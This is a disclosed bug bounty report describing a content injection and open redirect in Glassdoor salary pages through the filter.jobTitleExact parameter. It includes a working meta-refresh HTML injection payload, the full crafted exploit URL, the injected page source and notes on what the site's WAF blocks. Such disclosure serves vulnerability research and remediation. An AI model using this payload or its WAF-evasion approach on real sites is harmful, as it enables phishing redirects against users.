# XSS at https://www.glassdoor.com/Salary/* via filter.jobTitleExact

## Report Details
- **Report ID**: 789689
- **URL**: https://hackerone.com/reports/789689
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2020-02-06T00:49:29.522Z
- **Disclosed**: 2021-04-09T13:37:44.805Z

## Reporter
- **Username**: bendtheory
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: glassdoor

## Vulnerability Information
**Summary:** 
There exists a Cross Site Scripting and Content Injection vulnerability at https://www.glassdoor.com/Salary/* via the `filter.jobTitleExact` query parameter. Using URL encoded HTML entities, it is possible to inject HTML content and break out of the context of a <meta> tag. 

The WAF does a good job blocking most javascript payloads and appears to block parentheses, backticks, and document objects. If I do find a way to bypass the WAF and execute a javascript alert or similar, I will add a comment to this report. 

However, it is still possible to inject payloads to achieve content injection and open redirects. The following `<meta>` tag redirect payload is not blocked by the WAF:

```
"&gt;&lt;meta http-equiv="refresh" content ="0; url=//bit.ly"&gt;
```
And here's the final URL used:

https://www.glassdoor.com/Salary/Bain-and-Company--and-gt-and-lt-meta-http-equiv-refresh-content-0-url-bit-ly-and-gt-India-Salaries-E3752_DAO.htm?filter.jobTitleExact=%22%26gt%3B%26lt%3Bmeta+http-equiv%3D%22refresh%22+content+%3D%220%3B+url%3D%2F%2Fbit.ly%22%26gt%3B&selectedLocationString=N%2C115

The source of the page now looks like this:

```html
<meta name="description" content="No salaries available for salaries Bain & Company in "><meta http-equiv="refresh" content="0; url=//bit.ly">, but Glassdoor has India for similar job titles, locations or employers."/>
```
...which will redirect you to https://bit.ly

Affected URL or select Asset from In-Scope:

https://www.glassdoor.com/Salary/Bain-and-Company--and-gt-and-lt-meta-http-equiv-refresh-content-0-url-bit-ly-and-gt-India-Salaries-E3752_DAO.htm

Affected Parameter:

`filter.jobTitleExact`

Browsers tested:
Firefox and Chrome

## Steps To Reproduce:

  1. Click on the prepared URL: https://www.glassdoor.com/Salary/Bain-and-Company--and-gt-and-lt-meta-http-equiv-refresh-content-0-url-bit-ly-and-gt-India-Salaries-E3752_DAO.htm?filter.jobTitleExact=%22%26gt%3B%26lt%3Bmeta+http-equiv%3D%22refresh%22+content+%3D%220%3B+url%3D%2F%2Fbit.ly%22%26gt%3B&selectedLocationString=N%2C115
  2. You will be redirected to https://bit.ly

##Impact Description: 
This vulnerability could be used to facilitate phishing campaigns against Glassdoor users by redirecting to malicious sites. With additional research into bypassing the WAF, XSS payloads could steal sensitive cookies or steal credentials from users.

## Impact

This vulnerability could be used to facilitate phishing campaigns against Glassdoor users by redirecting to malicious sites. With additional research into bypassing the WAF, XSS payloads could steal sensitive cookies or steal credentials from users.

## Attachments
No attachments
